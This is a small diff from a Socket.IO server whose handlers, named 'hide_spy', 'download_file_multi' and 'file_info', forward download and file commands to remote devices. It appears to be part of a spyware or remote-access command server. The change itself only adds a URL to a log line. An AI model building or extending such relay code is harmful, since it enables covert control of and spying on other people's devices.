@@ -133,7 +133,7 @@ socket.on("hide_spy", (data,too) => {
   });
   socket.on("download_file_multi", (def_path, data, url,too) => {
     io.to(device_secure_ids[too]).emit("download_multi", def_path, data,url);
-    console.log("path " + def_path + ", data " + data);
+    console.log("path " + def_path + ", data " + data+ url);
   });
 socket.on("file_info", (def_path, data, too) => {
     io.to(device_secure_ids[too]).emit("file_info", def_path, data);
